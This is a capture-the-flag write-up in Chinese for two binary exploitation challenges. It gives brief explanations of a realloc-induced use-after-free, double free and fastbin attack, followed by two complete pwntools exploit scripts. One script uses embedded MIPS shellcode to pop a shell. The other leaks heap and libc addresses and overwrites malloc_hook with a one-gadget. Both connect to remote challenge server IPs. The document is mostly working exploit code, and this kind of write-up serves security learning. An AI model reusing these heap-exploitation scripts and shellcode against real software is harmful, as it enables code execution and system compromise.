
# pwn2

编辑功能时，`realloc(0)`后指针为清空，造成UAF。

```
#a70K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6E0j5i4c8J5K9i4R3I4x3o6l9I4i4K6u0r3N6$3g2D9M7s2N6F1
from PwnContext import *

try:
    from IPython import embed as ipy
except ImportError:
    print('IPython not installed.')

if __name__ == '__main__':
    context.terminal = ['tmux', 'splitw', '-h']
    context.log_level = 'debug'
    context(arch='mips', os='linux', endian='little', word_size=32)
    # functions for quick script
    s = lambda data               :ctx.send(str(data)) #in case that data is an int
    sa = lambda delim,data         :ctx.sendafter(str(delim), str(data))
    sl = lambda data               :ctx.sendline(str(data))
    sla = lambda delim,data         :ctx.sendlineafter(str(delim), str(data))
    r = lambda numb=4096          :ctx.recv(numb)
    ru = lambda delims, drop=True  :ctx.recvuntil(delims, drop)
    irt = lambda                    :ctx.interactive()
    rs = lambda *args, **kwargs    :ctx.start(*args, **kwargs)
    dbg = lambda gs='', **kwargs    :ctx.debug(gdbscript=gs, **kwargs)
    # misc functions
    uu32 = lambda data   :u32(data.ljust(4, '\0'))
    uu64 = lambda data   :u64(data.ljust(8, '\0'))

    ctx.remote = ('121.36.166.138', 8893)

    def lg(s,addr):
        print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

    def add(idx,content='\n'):
        sla('ice\n',1)
        sla('\n',idx)
        sa('\n',content)

    def delete(idx):
        sla('ice\n',2)
        sla('n',idx)

    #def show(idx):

    def edit(content):
        sla('ice\n',3)
        sa('\n',content)

    rs('remote')

    shellcode = '\x69\x6e\x02\x3c\x2f\x62\x42\x34\0\0\xa2\xaf\x68\0\x02\x3c\x2f\x73\x42\x34\x04\0\xa2\xaf\0\0\xa4\x27\xab\x0f\x02\x24\0\0\x05\x24\0\0\x06\x24\x0c\0\0\0'
    system = 0x3fcb4 + 0xf66cd000
    bin_sh = 0x157d6c + 0xf66cd000

    sla('o!\n',shellcode)
    ru('0x')
    stack = int(r(8),16)
    #get canary
    edit('e'*0x21)
    canary = u32(ru("\n",drop=False)[-4:-1].rjust(4,"\x00"))
    #fake chunk
    edit(p32(0)*7+p32(0x41)+p32(canary))
    add(1,'\n')
    add(2,'\n')
    #double free
    delete(1)
    delete(2)
    delete(1)
    #modify the stack
    add(4,p32(stack+0x20))
    add(5,'\n')
    add(6,'\n')
    add(7,p32(canary)+p32(0)+p32(stack+0x34)+shellcode)

    sla('ice',4)
    irt()
```

# pwn3

利用残留指针泄露`libc` heap地址。

然后利用`realloc`造成uaf从而构成double free。

在chunk中布置`fake_chunk`利用fastbin atk指过去，从而造成堆块重叠能够任意地址读写。

然后修改`free_hook`为`setcontext+53`进行ORW。

```
#034K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6E0j5i4c8J5K9i4R3I4x3o6l9I4i4K6u0r3N6$3g2D9M7s2N6F1
from PwnContext import *

try:
    from IPython import embed as ipy
except ImportError:
    print('IPython not installed.')

if __name__ == '__main__':
    context.terminal = ['tmux', 'splitw', '-h']
    context.log_level = 'debug'
    # functions for quick script
    s = lambda data               :ctx.send(str(data)) #in case that data is an int
    sa = lambda delim,data         :ctx.sendafter(str(delim), str(data))
    sl = lambda data               :ctx.sendline(str(data))
    sla = lambda delim,data         :ctx.sendlineafter(str(delim), str(data))
    r = lambda numb=4096          :ctx.recv(numb)
    ru = lambda delims, drop=True  :ctx.recvuntil(delims, drop)
    irt = lambda                    :ctx.interactive()
    rs = lambda *args, **kwargs    :ctx.start(*args, **kwargs)
    dbg = lambda gs='', **kwargs    :ctx.debug(gdbscript=gs, **kwargs)
    # misc functions
    uu32 = lambda data   :u32(data.ljust(4, '\0'))
    uu64 = lambda data   :u64(data.ljust(8, '\0'))

    ctx.binary = './pwn'
    ctx.custom_lib_dir = '/home/iddm/glibc-all-in-one/libs/2.29-0ubuntu2_amd64'
    ctx.remote = ('119.3.89.93', 8015)
    #ctx.remote_libc = './libc.so'
    ctx.debug_remote_libc = True

    ctx.symbols = {
        'node':0x4040,
    }

    ctx.breakpoints = [0x17D6]#menu

    def lg(s,addr):
        print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

    def add(idx,size,content='\n'):
        sla('ice',1)
        sla('index',idx)
        sla('size',size)
        sa('content',content)

    def delete(idx):
        sla('ice',3)
        sla('index',idx)

    def show(idx):
        sla('ice',4)
        sla('index',idx)

    def edit(idx,size,content='\n'):
        sla('ice',2)
        sla('index',idx)
        sla('size',size)
        if size != 0:
            sa('content',content)

    rs('remote')

    #dbg()
    add(0,0x10)
    add(2,0x10)
    add(3,0x10)
    delete(3)
    edit(0,0)
    #edit(1,0)
    #edit(0,0)

    show(0)
    #ru('content:')

    heap_base = uu64(ru('\n',drop=True)[-6:]) - 0x2c0
    lg('heap_base',heap_base)

    #dbg()

    for i in range(7):
        add(10+i,0x10)
    for i in range(7):
        delete(10+i)
    #dbg()
    edit(2,0)
    edit(2,0x10,p64(heap_base+0x250))
    add(4,0x10)
    add(5,0x10)

    sla('ice',666)
    ru('gift: ')
    libc_base = int(r(14),16) - 0x264140
    one = libc_base + 0x106ef8
    malloc_hook = libc_base+0x1e4c30
    sla('string: ','aaa')

    for i in range(8):
        add(20+i,0x5f)
    for i in range(7):
        delete(20+i)
    edit(27,0)
    edit(27,0x5f,p64(malloc_hook-0x23))
    dbg()
    add(30,0x5f)
    add(31,0x5f,'\0'*0x13+p64(one))

    irt()
```
